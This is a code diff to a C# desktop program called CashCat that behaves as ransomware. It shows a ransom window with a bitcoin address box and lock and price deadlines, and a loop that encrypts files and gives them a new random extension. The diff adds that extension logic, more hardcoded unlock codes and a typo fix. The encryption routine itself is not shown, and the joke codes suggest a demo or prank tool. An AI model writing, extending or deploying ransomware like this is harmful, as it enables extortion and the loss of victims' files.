@@ -46,6 +46,8 @@ namespace CashCat
         public DateTime lockTime = DateTime.Now.AddDays(5);
         public DateTime priceTime = DateTime.Now.AddDays(1);
 
+        private RansomFiles ransomwareDefinition = new RansomFiles();
+
 
 
         public MainWindow()
@@ -174,6 +176,9 @@ namespace CashCat
 
             if (filesToEncrypt.Count() != 0)
             {
+
+                string newExtension = ransomwareDefinition.GetRandomFileExtension();
+
                 btn_send.Visibility = Visibility.Hidden;
                 txtbox_Bitcoingaddess.Visibility = Visibility.Hidden;
                 encryptionInProgress = true;
@@ -188,7 +193,7 @@ namespace CashCat
                         lblLockingFile.Content = ("Encrypting: " + file.Name);
                     }), DispatcherPriority.ContextIdle);
 
-                    fileOperations.LockTXTFile(fileToEncrypt);
+                    fileOperations.LockTXTFile(fileToEncrypt, newExtension);
 
                 }
             }
@@ -230,10 +235,10 @@ namespace CashCat
         {
 
             string unlockCode = txtbox_Bitcoingaddess.Text;
-            if (txtbox_Bitcoingaddess.Text == "123456789" || txtbox_Bitcoingaddess.Text == "987654321" || txtbox_Bitcoingaddess.Text == "12345")
+            if (txtbox_Bitcoingaddess.Text == "123456789" || txtbox_Bitcoingaddess.Text == "987654321" || txtbox_Bitcoingaddess.Text == "12345" || txtbox_Bitcoingaddess.Text == "69420" || txtbox_Bitcoingaddess.Text == "42069" || txtbox_Bitcoingaddess.Text == "69" || txtbox_Bitcoingaddess.Text == "420")
             {
                 fileOperations.WriteLog("Starting Unlock Rename Operations!");
-                MessageBox.Show("Unlocked! Thanks! Your files will now be decrytped", "You did it correct", MessageBoxButton.OK);
+                MessageBox.Show("Unlocked! Thanks! Your files will now be decrypted", "You did it correct", MessageBoxButton.OK);
 
                 filesToDecrypt = fileOperations.GetRansomedFileCount(currentPath);
                 //fileOperations.WriteLog("Found: " + filesToDecrypt.Count() + " to DeCrypt!");            
